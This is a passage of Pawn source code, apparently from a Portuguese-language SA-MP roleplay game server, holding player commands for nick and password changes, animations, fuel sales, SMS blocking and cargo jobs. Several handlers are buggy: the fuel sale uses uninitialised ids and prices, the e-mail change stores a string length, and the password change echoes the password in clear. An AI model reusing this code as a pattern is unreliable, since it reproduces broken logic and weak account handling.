				    format(EmpresaInfo[WE_GetInt(gStr, "Contratado")][Funcionario2], 64, tmp);
				    WE_SetString(eid, "Funcionario2", tmp);
				}
   				if(strcmp(EmpresaInfo[WE_GetInt(gStr, "Contratado")][Funcionario3], PlayerName(playerid), true) == 0)
				{
				    format(EmpresaInfo[WE_GetInt(gStr, "Contratado")][Funcionario3], 64, tmp);
				    WE_SetString(eid, "Funcionario3", tmp);
				}
			}
			/*format(hFile, sizeof(hFile), "clans/%s.ini", PlayerName(playerid));
			if(fexist(hFile))
		    {
				new arquivo[128];
			  	format(arquivo, sizeof(arquivo), "clans/%s.ini", tmp);
			 	if(!fexist(arquivo))
				{
					WE_CreateFile(arquivo);
					WE_SetString(arquivo, "cla", WE_GetString(hFile, "cla"));
				  	WE_RemoveFile(hFile);
				}
				new G_Wolrd[128];
				format(G_Wolrd, sizeof(G_Wolrd), "clans/%s.ini", WE_GetString(arquivo, "cla"));
				if(fexist(G_Wolrd))
				{
					if(strcmp(WE_GetString(G_Wolrd, "Dono"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Dono", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro1"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro1", tmp);}
    				else if(strcmp(WE_GetString(G_Wolrd, "Membro2"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro2", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro3"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro3", tmp);}
    				else if(strcmp(WE_GetString(G_Wolrd, "Membro4"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro4", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro5"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro5", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro6"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro6", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro7"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro7", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro8"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro8", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro9"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro9", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro10"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro10", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro11"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro11", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro12"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro12", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro13"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro13", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro14"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro14", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro15"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro15", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro16"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro16", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro17"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro17", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro18"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro18", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro19"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro19", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro20"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro20", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro21"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro21", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro22"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro22", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro23"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro23", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro24"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro24", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro25"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro25", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro26"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro26", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro27"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro27", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro28"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro28", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro29"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro29", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro30"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro30", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro31"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro31", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro32"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro32", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro33"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro33", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro34"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro34", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro35"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro35", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro36"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro36", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro37"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro37", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro38"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro38", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro39"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro39", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro40"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro40", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro41"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro41", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro42"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro42", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro43"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro43", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro44"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro44", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro45"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro45", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro46"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro46", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro47"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro47", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro48"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro48", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro49"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro49", tmp);}
					else if(strcmp(WE_GetString(G_Wolrd, "Membro50"), PlayerName(playerid), true) == 0){WE_SetString(G_Wolrd, "Membro50", tmp);}
				}
		    }*/
			SendClientFormat(playerid, COR_AMARELO, "Você alterou seu nick. Nick antigo: %s. Nick novo: %s, não se esqueça!", PlayerName(playerid), tmp);
			//SendClientFormatAll(0xE86B3FFF, "O(A) jogador(a) {FFFFFF}%s {E86B3F}alterou seu nick para {FFFFFF}%s", PlayerName(playerid), tmp);
			new
			 	pNick[64]
		 	;
			format(pNick, sizeof(pNick), "%s - Nick alterado para: %s", PlayerName(playerid), tmp);
            LogNick(pNick);
			SetPlayerName(playerid, tmp);
		    if(fexist(gStr))
		    {
		        RenomearArquivo(gStr, gFile);
			}
			WE_SetInt(gFile, "Casa", HouseID);
			WE_SetInt(gFile, "Spawn", SpawnID);
			WE_SetInt(gFile, "EmpresaID", PropyID);
			N_Liberado[playerid] = 0;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Esse nick já existe, por favor, escolha outro.");
		    return 1;
		}
		return 1;
    }//FIM TROCA DE NICK
	if(!strcmp(cmd, "/mudarsenha", true))
	{
	    if(pInfo[playerid][Logado] == true)
	    {
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /MudarSenha [Nova senha]");
				return 1;
			}
			format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
			WE_SetInt(gFile, "Senha", pass_hash(tmp));
			format(gFile, sizeof(gFile), "Senha alterada com sucesso para: {FF0000}%s{FFFFFF}", tmp);
			SendClientMessage(playerid, COR_BRANCO, gFile);
			SendClientMessage(playerid, COR_ERRO, "Não esqueça da sua nova senha!");
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Simplismente você se fudeu otário ! Tente novamente.");
		    return 1;
		}
    }
	if(!strcmp(cmd, "/mudaremail", true))
	{
	    if(pInfo[playerid][Logado] == true)
	    {
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /MudarEmail [Novo e-mail]");
				return 1;
			}
			format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
			WE_SetInt(gFile, "Email", strlen(tmp));
			format(gFile, sizeof(gFile), "E-mail de recuperação alterado com sucesso para: {FF0000}%s{FFFFFF}", tmp);
			SendClientMessage(playerid, AZUL_WE, gFile);
			SendClientMessage(playerid, VERMELHO_WE, "Não esqueça do seu novo e-mail!");
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Tente novamente.");
		    return 1;
		}
    }
	if(!strcmp(cmdtext, "/limparficha", true))
	{
		if(PlayerToPoint(1.1, playerid, 358.9193, 166.1699, 1008.3828))
		{
		    if(GetPlayerCash(playerid) < 5000)
		    {
		        SendClientMessage(playerid, COR_ERRO, "Você precisa de no mínimo R$5000 para limpar um crime de sua ficha!");
		        return 1;
		    }
			if(GetPlayerWantedLevel(playerid) <= 0)
	      	{
				SendClientMessage(playerid, COR_ERRO, "Sua ficha criminal está limpa!");
				return 1;
	      	}
			SendClientMessage(playerid, COR_AMARELO, "Você limpou um crime da sua ficha por R$5000!");
		  	SetPlayerWantedLevel(playerid, (GetPlayerWantedLevel(playerid) - 1));
		  	sGivePlayerCash(playerid, -5000);
	      	return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está na prefeitura!");
		    return 1;
		}
	}
	if(strcmp(cmdtext, "/animloop", true) == 0)
	{
		if(Loop[playerid] == 0)
		{
		    SendClientMessage(playerid, COR_AMARELO, "Animes com repetição automatica ativado.");
		    Loop[playerid] = 1;
		}
		else if(Loop[playerid] == 1)
		{
		    SendClientMessage(playerid, COR_AMARELO, "Animes com repetição automatica desatiavado.");
		    Loop[playerid] = 0;
		}
		return 1;
	}
	if(strcmp(cmd, "/animstrip", true) == 0) {
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp)) {
	SendClientMessage(playerid,0xFF0000FF, "Uso válido: /animstrip [1-20]");
	return 1;
	}
	animeID = strval(tmp);
	if(animeID < 1 || animeID > 20) {
	SendClientMessage(playerid,0xFF0000FF, "Uso válido: /animstrip [1-20]");
	return 1;
	}
	if(animeID == 1) {
	ApplyAnimation(playerid,"STRIP","PLY_CASH",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 2) {
	ApplyAnimation(playerid,"STRIP","PUN_CASH",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 3) {
	ApplyAnimation(playerid,"STRIP","PUN_HOLLER",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 4) {
	ApplyAnimation(playerid,"STRIP","PUN_LOOP",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 5) {
	ApplyAnimation(playerid,"STRIP","strip_A",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 6) {
	ApplyAnimation(playerid,"STRIP","strip_B",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 7) {
	ApplyAnimation(playerid,"STRIP","strip_C",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 8) {
	ApplyAnimation(playerid,"STRIP","strip_D",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 9) {
	ApplyAnimation(playerid,"STRIP","strip_E",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 10) {
	ApplyAnimation(playerid,"STRIP","strip_F",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 11) {
	ApplyAnimation(playerid,"STRIP","strip_G",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 12) {
	ApplyAnimation(playerid,"STRIP","STR_A2B",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 13) {
	ApplyAnimation(playerid,"STRIP","STR_B2A",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 14) {
	ApplyAnimation(playerid,"STRIP","STR_B2C",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 15) {
	ApplyAnimation(playerid,"STRIP","STR_C1",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 16) {
	ApplyAnimation(playerid,"STRIP","STR_C2",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 17) {
	ApplyAnimation(playerid,"STRIP","STR_C2B",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 18) {
	ApplyAnimation(playerid,"STRIP","STR_Loop_A",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 19) {
	ApplyAnimation(playerid,"STRIP","STR_Loop_B",4.1,Loop[playerid],1,1,1,1);
	}else if(animeID == 20) {
	ApplyAnimation(playerid,"STRIP","STR_Loop_C",4.1,Loop[playerid],1,1,1,1);
	}
	return 1;
	}
	if(strcmp(cmd, "/renderse", true) == 0) {
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
	return 1;
	}
	}
	if(strcmp(cmd, "/dance", true) == 0) {
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) {
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp)) {
	SendClientMessage(playerid,0xFF0000FF, "Uso válido: /dance [1-3]");
	return 1;
	}
	animeID = strval(tmp);
	if(animeID < 1 || animeID > 3) {
	SendClientMessage(playerid,0xFF0000FF, "Uso válido: /dance [1-3]");
	return 1;
	}
	if(animeID == 1) {
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
	} else if(animeID == 2) {
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
	} else if(animeID == 3) {
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
	}
	return 1;
	}
	}
	if(!strcmp(cmd, "/desbugarcasa", true))
	{
		if(aInfo[playerid][Admin] == 1)
		{
			tmp = strtok(cmdtext, idx);
  			if(!strlen(tmp))
  			{
  			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /DesbugarCasa [ID]");
				return 1;
			}
  			new
				id = strval(tmp)
			;
			format(gStr, sizeof(gStr), "Você desbugou a conta de %s que agora pode comprar casa.", PlayerName(id));
			SendClientMessage(playerid, COR_AMARELO, gStr);
			WE_SetInt(f(id), "Casa", -1);
			WE_SetInt(f(id), "MorandoID", -1);
			return 1;
		}
	}
	if (strcmp("/bola", cmdtext, true, 6) == 0)
	{
		new Float:x, Float:y, Float:z;
		GetPlayerPos(playerid, x, y, z);
		DestroyObject(Ball);
		Ball = CreateObject(2114, x+random(3), y+random(3), z-0.8,0,0, 96);
		return 1;
	}
	if(!strcmp(cmd, "/contar", true))
	{
        new pname[MAX_PLAYER_NAME];
        GetPlayerName(playerid,pname,sizeof(pname));
		if(!strcmp(pname, "John_Lennon"))
		{
			tmp = strtok(cmdtext, idx);
  			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Contar [Tempo]");
				return 1;
			}
			if(strval(tmp) > 5)
			{
			    SendClientMessage(playerid, COR_ERRO, "Máximo de 5 segundos");
			    return 1;
			}
			new
				CountTimer = strval(tmp)
			;
			if(NumeroCount > 0)
			{
				SendClientMessage(playerid, COR_ERRO, "Já está sendo feita uma contagem, aguarde!");
				return 1;
			}
			NumeroCount = CountTimer;
			Contagem();
			return 1;
		}
    }
	if(!strcmp(cmd, "/capacete", true))
    {
		if(pInfo[playerid][Tem_Capacete] == 0)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem um capacete!");
		    return 1;
		}
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
	  		SendClientMessage(playerid, COR_ERRO, "Uso válido: /Capacete [Ativar/Desativar]");
			return 1;
		}
		else if(!strcmp(tmp, "ativar", true))
		{
	    	if(pInfo[playerid][StatusCapacete] == 0)
	      	{
	          	SendClientMessage(playerid, COR_AMARELO, "Seu capacete foi ativado com sucesso!");
      	    	if(IsPlayerInAnyVehicle(playerid) && EUmaBike(GetPlayerVehicleID(playerid)))
				{
					SetPlayerAttachedObject(playerid, 5, 18645, 2, 0.07,0,0, 88, 75, 0);
			    }
			    pInfo[playerid][StatusCapacete] = 1;
			}
			else if(pInfo[playerid][StatusCapacete] == 1)
			{
				SendClientMessage(playerid, COR_ERRO, "Seu capacete já está ativado!");
			}
			return 1;
		}
		else if(!strcmp(tmp, "desativar", true))
		{
 			if(pInfo[playerid][StatusCapacete] == 1)
			{
				SendClientMessage(playerid, COR_AMARELO, "Seu capacete foi desativado com sucesso!");
				RemovePlayerAttachedObject(playerid, 5);
				pInfo[playerid][StatusCapacete] = 0;
			}
	   		else if(pInfo[playerid][StatusCapacete] == 0)
	     	{
	        	SendClientMessage(playerid, COR_ERRO, "Seu capacete já está desativado!");
			}
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/vcombustivel", true))
	{
		if(pInfo[playerid][Prof] == FRENTISTA || aInfo[playerid][Admin] == 1)
		{
		    new	quantidade, id, valor;
			tmp = strtok(cmdtext, idx);
  			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /combustivel [ID] [Litros]");
	    	 	return 1;
			}
			quantidade = strval(tmp);
			if(quantidade > 100 || quantidade < 1)
				return SendClientMessage(playerid, COR_ERRO, "Quantidade inválida!");
			if(pInfo[id][Gas] >= 100)
				return SendClientMessage(playerid, COR_ERRO, "Seu tanque já está completo!");
		    if(GASO_Oferecido[playerid] == 1) return SendClientMessage(playerid, COR_ERRO, "Você acabou de vender skin aguarde um pouco!");
            tmp = strtok(cmdtext, idx);
            if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
            if(GetDistanceBetweenPlayers(playerid, id) > 15) return SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
            if(playerid == id) return SendClientMessage(playerid, COR_ERRO, "Você não pode vender Combustivel para você mesmo!");
          	if(GetPlayerCash(id) < valor) return SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) não tem dinheiro suficiente!");
            if(valor < 1 || valor > 200) return SendClientMessage(playerid, COR_ERRO, "Somente valores de 1 à 200.");
			format(gstring, sizeof(gstring), "Você ofereceu [%d] de Combustivel para %s, por R$%d !", quantidade, PlayerName(id), valor);
			SendClientMessage(playerid, -1, gstring);
			format(gStr, sizeof(gStr), "%s ofereceu pra você a skin ID %d por R$%d. (Use: /sAceitar ou /sRecusar)", PlayerName(playerid), valor);
			SendClientMessage(id, -1, gStr);
            GASO_ID[id] = playerid; GASO_PID[id] = playerid; GASO_VALOR[id] = valor; GASO_Oferecido[playerid] = 1; GASO_Recebido[id] = 1;
            GASO_IID[playerid] = id;
			GASO_Timer[id] = SetTimerEx("Skin", 4000, false, "d", id);
			GASO_Timer[playerid] = SetTimerEx("LiberarGaso", 30000, false, "d", playerid);
  		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é vendedor de roupas!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/caceitar", true))
	{
	    new quantidade, id;
	    if(GASO_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo Combustivel para você!");
		KillTimer(GASO_Timer[playerid]);
	    SendClientFormat(GASO_PID[playerid], 0xFFFF00AA, "(+) %s aceitou sua oferta, Combustivel vendido com sucesso!", PlayerName(playerid));
  		format(gStr, sizeof(gStr), "Você colocou '%d' litros de combustivel para '%s'.", quantidade, PlayerName(id));
		SendClientMessage(playerid, COR_AMARELO, gStr);
		pInfo[id][Gas] = quantidade;
	    SendClientFormat(playerid, 0xFFFF00AA, "Você comprou o Combustivel ! (Vendido por %s )", PlayerName(GASO_PID[playerid]));
	    sGivePlayerCash(playerid, -GASO_VALOR[playerid]);
		sGivePlayerCash(GASO_ID[playerid], GASO_VALOR[playerid]);
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "Gasolina ", GASO_SID[playerid]);
		/*				*/
		GASO_Oferecido[GASO_PID[playerid]] = 0;
		GASO_IID[GASO_PID[playerid]] = -1;
		GASO_Recebido[playerid] = 0;
    	GASO_Mensagem[playerid] = 0;
		GASO_VALOR[playerid] = 0;
		GASO_PID[playerid] = -1;
		GASO_SID[playerid] = 0;
	    return 1;
	}
	if(!strcmp(cmdtext, "/srecusar", true))
    {
        if(GASO_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo Combustivel para você!");
        KillTimer(GASO_Timer[playerid]); KillTimer(GASO_Timer[GASO_PID[playerid]]);
	    SendClientFormat(GASO_PID[playerid], 0xFFCC00AA, "%s recusou sua oferta, o Combustivel não foi vendida, sua venda não obteve sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "(Skin) Você recusou o Combustivel, oferta feita por %s, você não comprou o Combustivel.", PlayerName(GASO_PID[playerid]));
	    GASO_Oferecido[GASO_PID[playerid]] = 0;
	    GASO_IID[GASO_PID[playerid]] = -1;
	    GASO_Recebido[playerid] = 0;
    	GASO_Mensagem[playerid] = 0;
		GASO_VALOR[playerid] = 0;
		GASO_PID[playerid] = -1;
		GASO_SID[playerid] = 0;
        return 1;
    }
    if(!strcmp(cmd, "/bloquearsms", true))
	{
    	if(aInfo[playerid][Admin] == 1)
		{
    		new
				plid
			;
    		tmp = strtok(cmdtext, idx);
    		if(!strlen(tmp))
    		{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /bloquearsms [ID]");
    			return 1;
    		}
    		plid = strval(tmp);
    		if(IsPlayerConnected(plid))
			{
      			format(string, sizeof(string), "Você bloqueou %s de receber SMS.", PlayerName(plid));
    			SendClientMessage(playerid, COR_AMARELO, string);
    			format(string, sizeof(string), "O(A) administrador(a) %s bloqueou você de receber SMS.", PlayerName(playerid));
    			SendClientMessage(plid, COR_AMARELO, string);
    			PMBLOQUEADO[plid] = 1;
    			return 1;
    		}
			else
			{
    			SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
    			return 1;
    		}
    	}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		    return 1;
		}
    }

	if(strcmp(cmd, "/desbloquearsms", true) == 0)
	{
    	if(aInfo[playerid][Admin] == 1)
		{
    		new
				plid
			;
    		tmp = strtok(cmdtext, idx);
    		if(!strlen(tmp))
    		{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /desbloquearsms [ID]");
    			return 1;
    		}
    		plid = strval(tmp);
    		if(IsPlayerConnected(plid))
			{
      			format(string, sizeof(string), "Você desbloqueou %s de receber SMS.", PlayerName(plid));
    			SendClientMessage(playerid, COR_AMARELO, string);
    			format(string, sizeof(string), "O(A) administrador(a) %s desbloqueou você de receber SMS.", PlayerName(playerid));
    			SendClientMessage(plid, COR_AMARELO, string);
    			PMBLOQUEADO[plid] = 0;
    			return 1;
    		}
			else
			{
    			SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
    			return 1;
    		}
    	}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		    return 1;
		}
    }

	if(!strcmp(cmd, "/pegarmercadoria", true))
	{
     	if(IsPlayerInRangeOfPoint(playerid, 30.0, -1707.4425, 12.2478, 3.5547))
     	{
		    if(pInfo[playerid][Prof] == TRANSPORTADOR)
		    {
			    if(Mercadoria[playerid] == 1)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você já pegou a mercadoria!");
			        return 1;
				}
				PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
				SendClientMessage(playerid, COR_AMARELO, "Você pegou a mercadoria vá fazer as entregas!");
				SendClientMessage(playerid, AZUL_WE, "Vá em direção ao disco criado em seu mapa para fazer a entrega!");
				SendClientMessage(playerid, COR_AMARELO, "Seu destino é o Aeroporto de Los Santos!");
				RemovePlayerMapIcon(playerid, 90);
	    		SetPlayerMapIcon(playerid, 90, 2072.6030, -2298.4436, 13.5469, 48,0,MAPICON_GLOBAL_CHECKPOINT);
				Mercadoria[playerid] = 1;
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Transportador");
				return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está na área dos transportadores!");
		    return 1;
		}
	}

	if(!strcmp(cmd, "/emercadoria", true))
	{
     	if(PlayerToPoint(2.1, playerid, 2072.6030, -2298.4436, 13.5469))
     	{
		    if(pInfo[playerid][Prof] == TRANSPORTADOR)
		    {
			    if(Mercadoria[playerid] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não está com mercadoria!");
			        return 1;
				}
			    if(GetPlayerVehicleID(playerid) == vTRANSPORTADOR[0] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[1] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[2] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[3] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[4] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[5] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[6] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[7] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[8] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[9] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[10] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[11] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[12] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[13] ||
				GetPlayerVehicleID(playerid) == vTRANSPORTADOR[14])
				{
					SendClientMessage(playerid, 0x9999FFAA, "Mercadoria entregue com sucesso, volte para o local de carga para concluir!");
					SendClientMessage(playerid, AZUL_WE, "Vá em direção ao disco criado em seu mapa para concluir a entrega!");
					RemovePlayerMapIcon(playerid, 90);
		    		SetPlayerMapIcon(playerid, 90, -1737.9109,30.8485,3.5547, 48,0,MAPICON_GLOBAL_CHECKPOINT);
					PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
					Mercadoria1[playerid] = 1;
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COR_ERRO, "Você precisa estar em um dos veículos de transportador!");
			        return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você não é um(a) transportador!");
				return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está no local da entrega!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/mcomprovantes", true))
	{
     	if(PlayerToPoint(2.3, playerid, -1737.9109,30.8485,3.5547))
     	{
		    if(pInfo[playerid][Prof] == TRANSPORTADOR)
		    {
			    if(Mercadoria1[playerid] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não fez a entrega, volte e faça!");
			        return 1;
				}
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 499 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 456)
				{
				    if(pCargo[playerid] < 20)
				    {
						SendClientMessage(playerid, 0x66FF66AA, "Você concluiu a entrega e recebeu R$5.000!");
						pCargo[playerid] += 1;
						GameTextForPlayer(playerid, "~n~~n~~b~~h~ENTREGA CONCLUIDA!", 8500, 5);
						PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
						RemovePlayerMapIcon(playerid, 90);
